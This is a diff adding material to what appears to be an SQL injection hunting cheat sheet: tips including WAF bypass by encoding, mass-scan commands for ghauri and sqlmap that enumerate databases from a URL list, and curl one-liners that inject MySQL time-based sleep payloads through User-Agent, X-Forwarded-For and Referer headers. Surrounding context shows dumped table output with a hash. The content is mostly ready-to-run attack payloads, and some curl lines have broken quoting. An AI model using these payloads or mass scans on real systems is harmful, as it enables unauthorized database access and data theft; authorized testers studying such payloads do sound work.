@@ -1,4 +1,18 @@
 
+[+] Tips & Best Practices
+ * Always test for different SQL database types (MySQL, PostgreSQL, Oracle, MSSQL)
+ * Use time-based payloads when blind SQL injection is suspected
+ * Test all input parameters, including headers and cookies
+ * Start with low-risk payloads before increasing complexity
+ * Monitor response times carefully for time-based injections
+ * Document all findings and successful payloads
+ * Use different encoding techniques to bypass WAF
+ * Always get proper authorization before testing
+ * Test numeric parameters with specific numeric-based payloads
+ * Try different comment syntax for different databases
+ * Use database-specific functions for more accurate detection
+ * Combine multiple techniques when basic payloads fail
+
 [+] https://floppydata.com/
 [+] https://nav1n0x.gitbook.io/a-guide-to-manually-hunting-sql-injection
 [+] https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/
@@ -104,6 +118,35 @@ Table: usr
 | Init          | <blank_value>                            |
 +---------------+------------------------------------------+
 [+] SHA1 : a8372857cda513645e8e8494badc0db4aba94972 
+
+===================================================================================================================
+
+[+] Mass SQL injection testing using ghauri
+ghauri -m sql.txt --batch --dbs --level 3 --confirm
+
+[+] Mass SQL injection testing using sqlmap
+sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
+
+[+] Testing for time-based SQL injection via User-Agent header
+curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'
+
+[+] Testing for time-based SQL injection via X-Forwarded-For header
+curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'
+
+[+] Testing for time-based SQL injection via Referer header
+curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'
+
+[+] Alternative User-Agent based SQL injection test
+curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'
+
+[+] User-Agent header-based MySQL time-based injection
+curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'
+
+[+] X-Forwarded-For header-based MySQL time-based injection
+curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'
+
+[+] Referer header-based MySQL time-based injection
+curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'
 
 ===================================================================================================================
 
